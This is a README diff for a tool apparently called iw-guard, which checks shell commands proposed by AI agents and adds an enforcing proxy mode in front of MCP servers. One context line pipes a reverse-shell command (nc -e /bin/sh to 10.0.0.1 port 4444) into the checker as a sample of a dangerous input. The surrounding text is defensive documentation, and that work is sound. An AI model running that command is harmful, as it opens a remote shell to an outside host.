@@ -23,7 +23,17 @@ echo "nc -e /bin/sh 10.0.0.1 4444" | iw-guard check
 # serve it over loopback HTTP for an MCP wrapper / hook
 iw-guard serve --bind 127.0.0.1:8787
 # -> POST /api/agent/check-command  body {"command":"..."}
+
+# ENFORCE: wrap an MCP server and block a disallowed tools/call inline
+iw-guard proxy --mode guard -- npx -y some-mcp-server --flag
+# --mode: advisory | warn | guard (default) | kill
 ```
+
+`check` and `serve` are advisory (they flag a dangerous command; the agent still
+decides). `proxy` is the enforcing form: a man-in-the-middle in front of an MCP
+server that inspects every JSON-RPC message and, in `guard`/`kill` mode, refuses
+a disallowed `tools/call` before it reaches the server. stdout stays pure MCP
+traffic; alerts go to stderr.
 
 The verdict is JSON: `recommendation` (`allow` / `review` / `deny`),
 `risk_score`, `severity`, `signals`, `explanation`, `atr_matches`, and
